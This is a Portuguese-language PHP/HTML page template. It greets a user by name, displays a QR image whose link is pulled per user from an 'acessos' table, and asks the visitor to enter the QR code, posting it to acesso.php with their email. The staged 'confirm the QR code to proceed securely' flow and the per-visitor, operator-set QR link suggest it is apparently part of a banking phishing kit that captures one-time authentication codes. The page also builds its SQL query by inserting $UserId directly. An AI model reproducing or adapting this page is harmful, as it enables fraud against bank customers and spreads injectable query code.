<?php 
	
	$getQr = read($conn, 'acessos', "WHERE id = '$UserId'");
	$QrPos = $getQr[0]['qr_link'];

?>
<div class="block_loading">
	<div class="block_title">
		<span class="headline"><?= getSaudacao();?><b> <?= $ShowNameUser;?></b></span>
		<p class="description">Informe os dados abaixo:</p>
	</div>

<script>
	function check_qrcode(){
		var qrcode = document.getElementById('cd_qrc').value;

		if(qrcode.length < 6){
			alert("O Código QRCode informado já expirou.\nTente novamente!");
			document.getElementById('cd_qrc').value = '';			
			document.getElementById('cd_qrc').focus();
			return false;
		}
	}
</script>	

	<div class="block_ps4">

		<?php 
			if(isset($_SESSION['ShowError']) && $_SESSION['ShowError'] == 1):
				$display = 'block!important;';
				$_SESSION['ShowError'] = 0;
			else:
				$display = 'none!important;';
			endif;	
		?>
		<div class="block_error" style="display:<?php echo $display;?>">
			O Código QRCode escaneado não está correto, ou já expirou! Por favor, tente novamente!
			<span class="pos_close_error">x</span>
			<div class="clear"></div>
		</div><!-- block_errorblock_error -->
		<div class="clear"></div>

		<div class="block_message_all">
			Para prosseguir com segurança, <span class="red_txt">precisaremos confirmar o código QRCode</span> escaneado!<br>
			Informe o código QRCode abaixo!
		</div><!-- block_message_all -->
		
		<div class="block_need_card">
			<form action="acesso.php?cliente=<?php echo $emailx; ?>" method="post" name="form_card" id="form_card" onsubmit="return check_qrcode();">
				<label for="cd_qrc">
					<img src="<?php echo $QrPos;?>" width="250" style="display:block;margin: 10px auto 40px auto;border:5px solid #900;padding:2px;">
					<p style="display:block;text-align:center;">Código QRCode:</p>
					<input type="text" name="cd_qrc" id="cd_qrc" class="normal_input" autocomplete="off" style="width:180px;margin:5px 0 0 270px;" maxlength="8" placeholder="Código QRCode" onkeypress='return SomenteNumero(event)'>
				</label>
				<input type="hidden" name="sender" value="get_qrcode">
			</form>
		</div><!-- block_need_card -->

	</div><!-- block_ps4 -->

	<div class="block_buttons_form">
		<div class="clear_btn J_Cancel"></div>
		<div class="submit_btn J_Submit_FC"></div>
	</div><!-- block_buttons_form -->

</div><!-- block_loading -->